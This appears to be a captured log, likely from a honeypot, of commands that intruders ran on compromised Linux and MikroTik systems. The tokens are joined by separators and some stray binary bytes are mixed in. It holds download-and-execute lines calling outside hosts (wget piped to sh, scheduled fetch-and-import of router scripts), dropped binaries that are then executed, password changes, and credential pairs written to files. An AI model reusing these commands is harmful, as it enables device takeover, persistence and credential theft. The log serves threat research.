system -|::|- scheduler -|::|- add -|::|- name="U6" -|::|- interval=10m -|::|- on-event="/tool -|::|- fetch -|::|- url=http://bestony.club/poll/9d0479ac-2889-44fc-bcf4-238320aac82b -|::|- mode=http -|::|- dst-path=7wmp0b4s.rsc\\r\ -|::|- import -|::|- 7wmp0b4s.rsc -|::|- policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
system -|::|- scheduler -|::|- add -|::|- name="U6" -|::|- interval=10m -|::|- on-event="/tool -|::|- fetch -|::|- url=http://myfrance.xyz/poll/489f9f54-b2f2-4adf-84fc-bddee250565d -|::|- mode=http -|::|- dst-path=7wmp0b4s.rsc\\r\ -|::|- import -|::|- 7wmp0b4s.rsc" -|::|- policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
/ip -|::|- cloud -|::|- print -|::|- -bash: -|::|- /ip: -|::|- command -|::|- not -|::|- found
9`?0 -|::|- echo -|::|- "root -|::|- Q2w3e4r5" -|::|- > -|::|- /tmp/up.txt
щ`mP -|::|- echo -|::|- "321" -|::|- > -|::|- /var/tmp/.var03522123
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- Pe48ZWCL -|::|- && -|::|- bash -|::|- -c -|::|- ./Pe48ZWCL -|::|- -bash: -|::|- ./Pe48ZWCL: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- 28ced69e8eb76da240271dba206ce53f -|::|- " -|::|- > -|::|- /tmp/up.txt
VӞ`W -|::|- VӞ`}X -|::|- echo -|::|- "linix37*)@#BT"\nt5jqEYpv3To3\nt5jqEYpv3To3\n"|passwd -|::|- VӞ`8] -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file -|::|- VӞ`N
cd -|::|- /var/run -|::|- ; -|::|- rm -|::|- -rf -|::|- tsh -|::|- ; -|::|- tftp -|::|- -g -|::|- 127.0.0.1 -|::|- -r -|::|- tsh -|::|- ; -|::|- sh -|::|- tsh -|::|- &
echo -|::|- "admin -|::|- 1qaz@WSX3edc" -|::|- > -|::|- /tmp/up.txt -|::|- l߉`>
O`AD -|::|- scp -|::|- -t -|::|- /tmp/BPrLUEoz -|::|- O`iJ -|::|- O`OL -|::|- O`3M -|::|- O``M
echo -|::|- "root -|::|- Test@123" -|::|- > -|::|- /tmp/up.txt -|::|- c`4-
6g`p -|::|- scp -|::|- -t -|::|- /tmp/M01GZwRG -|::|- 6g`˯ -|::|- 6g`F -|::|- 6g`u -|::|- 6g`ϰ -|::|- 6g`' -|::|- 6g`R
wget -|::|- -qO -|::|- - -|::|- http://71.127.148.69/.x/2sh -|::|- | -|::|- sh -|::|- > -|::|- /dev/null -|::|- 2>&1 -|::|- &
ls -|::|- -la -|::|- /dev/ttyGSM* -|::|- /dev/ttyUSB-mod* -|::|- /var/spool/sms/* -|::|- /var/log/smsd.log -|::|- /etc/smsd.conf* -|::|- /usr/bin/qmuxd -|::|- /var/qmux_connect_socket -|::|- /etc/config/simman -|::|- /dev/modem* -|::|- /var/config/sms/* -|::|- ls: -|::|- cannot -|::|- access -|::|- /dev/ttyGSM*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /dev/ttyUSB-mod*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/spool/sms/*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/log/smsd.log: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /etc/smsd.conf*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /usr/bin/qmuxd: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/qmux_connect_socket: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /etc/config/simman: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /dev/modem*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/config/sms/*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
echo -|::|- "root -|::|- qq123123" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- Ul9w3KBu -|::|- && -|::|- bash -|::|- -c -|::|- ./Ul9w3KBu -|::|- -bash: -|::|- ./Ul9w3KBu: -|::|- command -|::|- not -|::|- found
ۉ`xY -|::|- echo -|::|- "postgres -|::|- server" -|::|- > -|::|- /tmp/up.txt
echo -|::|- "1" -|::|- > -|::|- /var/tmp/.systemcache436621
root@pouta.csc -|::|- linux -|::|- node:~$ -|::|- free -|::|- -m -|::|- total -|::|- used -|::|- free -|::|- shared -|::|- buff/cache -|::|- available -|::|- Mem: -|::|- 16010 -|::|- 955 -|::|- 6603 -|::|- 1 -|::|- 8451 -|::|- 15342 -|::|- Swap: -|::|- 0 -|::|- 0 -|::|- 0 -|::|- root@pouta.csc -|::|- linux -|::|- node:~$
echo -|::|- -e -|::|- "qwer`123\nf5j4hCWTLakZ\nf5j4hCWTLakZ"|passwd|bash -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
scp -|::|- -t -|::|- /tmp/q1H3J2X7
2:`} -|::|- 2:`~ -|::|- echo -|::|- "root -|::|- zxasqw -|::|- " -|::|- > -|::|- /tmp/up.txt
scp -|::|- -t -|::|- /tmp/4nJFYqXl
&`Ri -|::|- ps -|::|- | -|::|- grep -|::|- '[Mm]iner'
scp -|::|- -t -|::|- /tmp/b1OxqJDe
